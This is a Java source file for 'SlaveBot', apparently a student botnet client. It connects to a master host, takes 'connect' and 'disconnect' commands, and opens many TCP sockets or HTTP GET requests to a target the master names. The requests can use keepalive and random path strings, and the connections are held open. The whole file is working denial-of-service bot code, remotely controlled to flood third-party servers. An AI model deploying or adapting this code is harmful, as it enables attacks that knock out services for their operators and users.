import java.net.*;
import java.io.*;
import java.util.*;

class Connection {
    Socket sock;
    String hostname;
    int port;
    Boolean disconnected;
    Boolean flag_keepalive;
}

class Http_Connection {
    HttpURLConnection http_client;
    String hostname;
    int port;
    String url_str;
    Boolean disconnected;
    Boolean flag_keepalive;
}

public class SlaveBot {

    static ArrayList<Connection> connList = new ArrayList<Connection>();
    static ArrayList<Http_Connection> httpconList = new ArrayList<Http_Connection>();

    public static void main(String[] args) {
        SlaveBot bot_obj = new SlaveBot();

        Socket con = null;
        Socket s = null;
        BufferedReader nw_in = null;
        int remote_port = 0, num_con_int = 0;
        String remoteHost = null;
        String[] words;
        String command, remotePort , num_con , str_url=null;
        boolean flag_keepalive = false;
        boolean flag_httprequest = false;

        if (args.length < 4) {
            System.err.println("Usage: java Slave  -h <MasterIP|MasterHostname> -p <masterPort>");
            System.exit(-1);
        } 
        else if (!args[0].equalsIgnoreCase("-h") || !args[2].equalsIgnoreCase("-p")) {
            System.err.println("Usage java Slave -h <MasterIP | MasterHostname> -p <masterPort>");
            System.exit(-1);
        }

        System.out.println("\n");
        try {
            con = new Socket(args[1].toString(), Integer.parseInt(args[3]));
        }
        catch(Exception ex) {
            //Any reason the connection fails...
            System.err.println(ex);
            System.err.println("Connection Failed. Exiting...");
            System.exit(-1);
        }
        System.out.println("Connection Successful.");
        System.out.println("MasterIP: "+ args[1] + " MasterPort: "+ args[3] +" LocalPort: "+ con.getLocalPort());

        try {
            nw_in = new BufferedReader(new InputStreamReader(con.getInputStream()));

            while(true) {
                flag_keepalive = false;
                String line = nw_in.readLine();
                if (line == null || line.length() == 0) {
                    System.out.println("Disconnected from server");
                    break;
                }
                if (line.equals("Hello")) {
                    continue;
                }
                words = line.split("\\s+");
                command = words[0];    //command
                remoteHost = words[1]; //remoteHost/IP
                remotePort = words[2];       //remote port

                if (command.equalsIgnoreCase("connect")) {
                    num_con = words[3];       //number of connections to the remote server.
                    flag_keepalive = false;   //reset keepalive flag
                    flag_httprequest = false; //reset url flag;

                    if(words.length >= 5 && words.length <= 6) {
                        if(words.length == 6){
                            str_url = words[5];
                            flag_keepalive = true;
                            flag_httprequest = true;
                            System.out.println("\n[Command:"+ command+"] [RemoreHost: "+remoteHost+":"+remotePort+ 
                                    "] [TotalConnections:"+num_con+"] [keepalive: set] [url request: "+str_url+ "] received.");	
                        }
                        if(words.length == 5) {
                            if(words[4].equals("keepalive")){
                                flag_keepalive = true;
                                System.out.println("\n[Command:"+ command+"] [RemoreHost: "+remoteHost+":"+remotePort+ 
                                        "] [TotalConnections:"+num_con+"]    [keepalive: set] received.");
                            }else if(words[4].startsWith("url")){	
                                str_url = words[4];
                                flag_httprequest = true;
                                System.out.println("\n[Command:"+ command+"] [RemoreHost: "+remoteHost+":"+remotePort+
                                        "] [TotalConnections:"+num_con+"] [url request: "+str_url+ "] received.");	
                            }
                        }
                    } else {
                        flag_keepalive = false;
                        flag_httprequest = false;
                        System.out.println("\n[Command:"+ command+"] [RemoreHost: "+remoteHost+":"+remotePort+ 
                                "] [TotalConnections:"+num_con+"]  received.");
                    }


                    try {
                        remote_port = Integer.parseInt(remotePort);
                        num_con_int = Integer.parseInt(num_con);
                    }
                    catch (Exception ex) {
                        System.err.println("Invalid value for targetPort OR numberOfConnections : " + remotePort+" "+num_con);
                        System.err.println(ex);
                        continue;
                    }

                    if(flag_httprequest == true){
                        if(flag_keepalive == true)
                        {
                            try{
                                /*create Httprequests for keepalive and URL options*/
                                bot_obj.send_httprequest(remoteHost,remote_port,num_con_int,flag_keepalive,str_url);
                            } catch (Exception Ex){
                                System.out.println("Exception during send_httprequest\n");
                                System.err.println(Ex);
                            }
                        }
                        else
                        {
                            try{
                                /*create Httprequests for URL option sent by the master*/
                                bot_obj.send_httprequest(remoteHost,remote_port,num_con_int,flag_keepalive,str_url);
                            } catch (Exception Ex) {
                                System.out.println("Exception during send_httprequest\n");
                                System.err.println(Ex);
                            }
                        }


                    } else {
                        /*create normal TCP connections with the
                          remote server if URL option sent by the master. */
                        for(int j=0;j<num_con_int;j++) {

                            //Create a connection to that target
                            try {
                                s = new Socket(remoteHost, remote_port);
                                if(flag_keepalive == true){
                                    s.setKeepAlive(true);
                                }
                            }
                            catch (Exception ex) {
                                System.err.println(ex);
                                System.err.println("Failed to connect to remote Host at " + remoteHost + ":" + remotePort);
                                System.err.println(ex);
                                continue;
                            }

                            System.out.println("Connected to: ("+ s.getInetAddress() + "):"+ s.getPort() +" LocalPort:"+ s.getLocalPort());

                            Connection c = new Connection();
                            c.sock = s;
                            c.hostname = remoteHost;
                            c.port = remote_port;
                            c.disconnected = false;
                            if(flag_keepalive == true)
                                c.flag_keepalive = true;
                            connList.add(c);
                        }

                    }
                    //We are done with this command. Lets go for next command
                    continue;
                }

                if (command.equalsIgnoreCase("disconnect")) {
                    System.out.println("\n[Command:"+ words[0]+"] [RemoteHost: "+remoteHost+":"+remotePort+ "]  received.");
                    remote_port = -1;
                    if (!remotePort.equals("all")) {
                        try {
                            remote_port = Integer.parseInt(remotePort);
                        }
                        catch (Exception ex) {
                            System.err.println("Invalid value for targetPort : " + remotePort);
                            System.err.println(ex);
                            continue;
                        }
                    }

                    //System.out.println("Disconnecting connections to " + remoteHost + " on " + remotePort + " port");
                    for (int j = 0; j < connList.size(); j++) {
                        Connection c = connList.get(j);
                        if (c.hostname.equals(remoteHost)) {
                            if (remote_port == -1 || c.port == remote_port) {
                                System.out.println("Disconnecting " + c.hostname + " " + c.port);
                                //Disconnect all connections
                                try {
                                    c.sock.close();
                                    c.disconnected = true;
                                } catch (IOException ex) {
                                    System.err.println("Failed to close the socket");
                                    System.err.println(ex);
                                }
                            } else {
                                System.out.println("Not Disconnecting " + c.hostname + " " + c.port);
                            }
                        } else {
                            System.out.println("Not Disconnecting " + c.hostname + " " + c.port);
                        }
                    }

                    //Remove all connections that are closed
                    ListIterator<Connection> it = connList.listIterator();
                    while(it.hasNext()) {
                        Connection cc = it.next();
                        if (cc.disconnected) {
                            it.remove();
                        }
                    }

                    /* Disconnect all explicit Http requests */
                    for (int j = 0; j < httpconList.size(); j++) {
                        Http_Connection c1 = httpconList.get(j);
                        if (c1.hostname.equals(remoteHost)) {
                            if (remote_port == -1 || c1.port == remote_port) {
                                System.out.println("HttpRequest: Disconnecting " + c1.hostname + " " + c1.port);
                                //Disconnect all connections

                                c1.http_client.disconnect();
                                c1.disconnected = true;
                            } else {
                                System.out.println("HttpRequest: Not Disconnecting " + c1.hostname + " " + c1.port);
                            }
                        } else {
                            System.out.println("HttpRequest: Not Disconnecting " + c1.hostname + " " + c1.port);
                        }
                    }

                    //Remove all connections that are closed
                    ListIterator<Http_Connection> it1 = httpconList.listIterator();
                    while(it1.hasNext()) {
                        Http_Connection cc1 = it1.next();
                        if (cc1.disconnected) {
                            it1.remove();
                        }
                    }

                }

            }
        }
        catch(IOException ex) {
            System.err.println(ex);
        }
        finally {
            try {
                if(con != null) con.close();
            }
            catch (IOException ex) {}
        }
    }


    // HTTP GET request
    public void send_httprequest(String remoteHost,int remote_port,int num_con,Boolean flag, String url_strng) throws Exception
    {
        String url = null;
        String rand_text = null;
        Random rng = new Random();
        int responseCode;
        String inputLine;

        if (!url_strng.startsWith("url=")) {
            System.out.println("unknown URL option format. Httprequest could not be initiated with host: "+ remoteHost+"\n");
        } else {
            /* strip string "url=" from url_strng*/
            String linearr[] = url_strng.split("=",2);
            url_strng = linearr[1];
            //System.out.println("url_strng = "+url_strng);
            for(int k=0;k < num_con;k++)
            {
                rand_text = generate_string(rng, "abcdefghijklmnopqrstuvwxyz", 10);
                url = "http://"+remoteHost+url_strng+rand_text;
                //System.out.println("url => "+url+"\n");

                try {
                    URL obj = new URL(url);
                    HttpURLConnection hcon = (HttpURLConnection) obj.openConnection();

                    // optional default is GET
                    hcon.setRequestMethod("GET");

                    responseCode = hcon.getResponseCode();
                    System.out.println("\nSending 'GET' request to URL : " + url);
                    System.out.println("Response Code : " + responseCode);

                    BufferedReader in = new BufferedReader(new InputStreamReader(hcon.getInputStream()));
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close(); 

                    //System.out.println(response.toString());
                    response.delete(0, response.length());

                    if (responseCode == Integer.parseInt("200")) {
			    //Now add this HttpURLConnection object to the ArrayList
        	            Http_Connection h = new Http_Connection();
        	            h.http_client = hcon;
        	            h.hostname = remoteHost;
        	            h.port = remote_port;
        	            if(flag == true)
        	                h.flag_keepalive = true;
        	            h.disconnected = false;
        	            httpconList.add(h);	
		    } else {
			    System.out.println("HTTPRequest Failure. Connection not saved\n");
		    }

                } catch (Exception ex) {
                    System.err.println(ex);
                }
            }
        }
    }

    public String generate_string(Random rng, String my_string, int length)
    {
        char[] text = new char[length];
        for(int i=0;i<length;i++)
        {
            text[i] = my_string.charAt(rng.nextInt(my_string.length()));
        }
        return new String(text);
    }

}
